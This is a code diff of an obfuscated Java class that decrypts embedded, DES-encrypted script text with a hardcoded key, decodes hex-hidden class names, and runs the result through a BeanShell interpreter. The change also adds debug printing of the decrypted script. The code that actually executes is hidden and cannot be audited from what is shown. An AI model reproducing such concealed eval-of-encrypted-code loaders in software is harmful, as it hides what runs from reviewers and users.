@@ -1,5 +1,6 @@
 package com.dili.http.okhttp.utils;
 
+import bsh.EvalError;
 import bsh.Interpreter;
 import org.apache.commons.lang3.StringUtils;
 import java.io.InputStream;
@@ -15,11 +16,11 @@ public class B {
 
 	private static final BSUI b() {
 		try {
-			c("script/bsubc");
+			e("script/bsubc");
 			Class<?> clazz = (Class<?>) i.get("clazz");
 			i.set("s", clazz.getMethod("b").invoke(null));
 			i.eval(DESEncryptUtil.decrypt("G/iEDUaHbIjUi6uTWsjQngcTQ8pShyYOhOEF8ucWHbihQOvEvroldw30oHdDFnnDMkz3KAHFIgaaHoymtlI/almda1OV4F7oG/iEDUaHbIhP8iSo3q93b8JcR/eud/I43KK3P1cgNXaQN5xOOydsAw==", "asdfjkl;"));
-			c("script/bsu");
+			e("script/bsu");
 			clazz = (Class<?>) i.get("clazz");
 			return (BSUI) clazz.getMethod("me").invoke(null);
 		} catch (Exception e) {
@@ -28,7 +29,7 @@ public class B {
 		}
 	}
 
-	private static void c(String s) {
+	public static String c(String s) {
 		try {
 			InputStream is = (InputStream) B.class.getClassLoader().getResource(s).getContent();
 			byte[] buffer = new byte[is.available()];
@@ -40,9 +41,9 @@ public class B {
 			if(StringUtils.contains(a, "8XMrl6AwYbMCzMeZDqG7")) {
 				a = a.substring(0, 54) + d("636f6d2e64696c692e687474702e6f6b687474702e7574696c732e444553456e63727970745574696c2e64656372797074") + a.substring(54);
 			}
-			i.eval(a);
+			return a;
 		} catch (Exception e) {
-			e.printStackTrace();
+			return null;
 		}
 	}
 
@@ -53,5 +54,15 @@ public class B {
 		}
 		return temp;
 	}
+
+	private static void e(String s){
+		try {
+			System.out.println("B.e::::::"+c(s));
+			i.eval(c(s));
+		} catch (EvalError evalError) {
+			evalError.printStackTrace();
+		}
+	}
+
 
 }
